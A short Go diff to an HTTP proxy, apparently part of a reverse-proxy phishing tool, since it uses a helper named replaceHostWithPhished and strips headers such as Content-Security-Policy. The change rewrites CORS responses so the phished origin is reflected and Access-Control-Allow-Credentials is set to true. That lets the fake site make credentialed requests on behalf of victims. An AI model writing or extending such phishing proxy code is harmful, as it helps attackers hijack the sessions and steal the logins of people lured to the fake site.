@@ -607,8 +607,22 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" {
-				resp.Header.Set("Access-Control-Allow-Origin", "*")
-				resp.Header.Set("Access-Control-Allow-Credentials", "true")
+
+				origin_from_request := resp.Request.Header.Get("Origin")
+				if (origin_from_request == ""){
+					resp.Header.Set("Access-Control-Allow-Origin", "*")
+				}else{
+					scheme_origin := strings.Split(origin_from_request, "//")
+					r_origin, ok := p.replaceHostWithPhished(scheme_origin[1])
+					scheme := scheme_origin[0]
+					final_url := scheme + "//" + r_origin
+					if (ok){
+						resp.Header.Set("Access-Control-Allow-Origin", final_url)
+						resp.Header.Set("Access-Control-Allow-Credentials", "true")
+					}else{
+						resp.Header.Set("Access-Control-Allow-Origin", "*")
+					}
+				}
 			}
 			var rm_headers = []string{
 				"Content-Security-Policy",
